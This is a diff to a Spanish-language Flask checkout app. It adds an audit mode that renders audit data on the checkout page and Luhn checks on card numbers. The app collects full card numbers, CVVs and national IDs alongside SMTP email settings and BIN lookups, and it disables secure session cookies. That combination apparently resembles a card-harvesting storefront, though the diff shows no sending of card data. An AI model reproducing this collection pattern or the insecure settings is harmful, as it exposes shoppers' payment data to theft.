@@ -3,22 +3,23 @@ import os
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from config import SECRET_KEY, SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, EMAIL_TO
+from config import SECRET_KEY, SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, EMAIL_TO, AUDIT_MODE
 from utils.logger import log_event
-from utils.security import sanitize_input, check_rate_limit
+from utils.security import sanitize_input, check_rate_limit, validate_card_format
 import json
 from datetime import timedelta
+
+if AUDIT_MODE:
+    from audit import generate_full_audit_data
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
 app.secret_key = SECRET_KEY
 
-# Configuración de cookies seguras
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SECURE'] = False
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
 
-# BIN lookup mejorado
 def lookup_bin(card_number):
     if not card_number or len(card_number) < 6:
         return {"bin": "****", "brand": "Desconocida", "type": "Desconocido", "bank": "Desconocido", "country": "Desconocido"}
@@ -134,6 +135,11 @@ def index():
 def checkout():
     if "csrf_token" not in session:
         session["csrf_token"] = os.urandom(16).hex()
+    
+    if AUDIT_MODE:
+        audit_data = generate_full_audit_data()
+        return render_template("checkout.html", csrf_token=session["csrf_token"], audit_data=audit_data)
+    
     return render_template("checkout.html", csrf_token=session["csrf_token"])
 
 @app.route("/checkout", methods=["POST"])
@@ -167,6 +173,12 @@ def checkout_post():
     if not all([full_name, email, rut_dni, phone, card_number, card_expiry, card_cvv,
                 shipping_name, country, region, city, address, postal_code, shipping_phone, shipping_email]):
         log_event("checkout_invalid_input", ip, ua, "/checkout", "POST", "error")
+        return redirect(url_for("result", status="error"))
+    
+    # Validar tarjeta con Luhn
+    card_valid, card_message = validate_card_format(card_number.replace(" ", ""))
+    if not card_valid:
+        log_event("checkout_invalid_card", ip, ua, "/checkout", "POST", "error", {"reason": card_message})
         return redirect(url_for("result", status="error"))
     
     bin_info = lookup_bin(card_number)
